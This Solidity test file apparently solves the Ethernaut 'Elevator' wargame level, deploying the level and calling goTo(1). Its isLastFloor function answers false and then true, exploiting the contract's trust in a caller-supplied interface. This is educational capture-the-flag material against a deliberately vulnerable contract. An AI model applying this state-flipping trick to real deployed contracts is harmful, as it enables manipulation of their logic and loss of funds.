pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/Elevator/ElevatorHack.sol";
import "../../src/Elevator/ElevatorFactory.sol";
import "../../src/Ethernaut.sol";

contract ElevatorTest is DSTest, Building {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testElevatorHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        ethernautElevator.goTo(1);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
    }

    bool first = true;
    function isLastFloor(uint) external returns (bool) {
        if (first) {
            first = false;
            return false;
        }
        return true;
    }
}